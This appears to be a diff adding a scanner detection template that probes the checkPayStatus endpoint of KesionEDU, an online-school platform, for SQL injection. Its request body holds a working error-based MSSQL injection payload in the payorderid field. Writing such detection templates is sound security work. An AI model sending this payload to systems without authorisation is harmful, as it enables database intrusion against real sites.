@@ -1,0 +1,36 @@
+id: poc-yaml-kesion-edu-checkpaystatus-sqli
+info:
+  name: 科汛网校KesionEDU checkPayStatus SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects an SQL injection vulnerability in the checkPayStatus endpoint of KesionEDU.
+
+variables:
+  t1: "{{rand_int(1000,10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "/Webapi/Common/checkPayStatus"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"payorderid":"1' AND 9173 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')))) AND 'rhYc'='rhYc","apptoken":"1"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "System.Data.SqlClient.SqlException"
+          - "转换成数据类型"
+          - "在将"
+      - type: regex
+        part: body
+        regex:
+          - "0x{{t2}}"
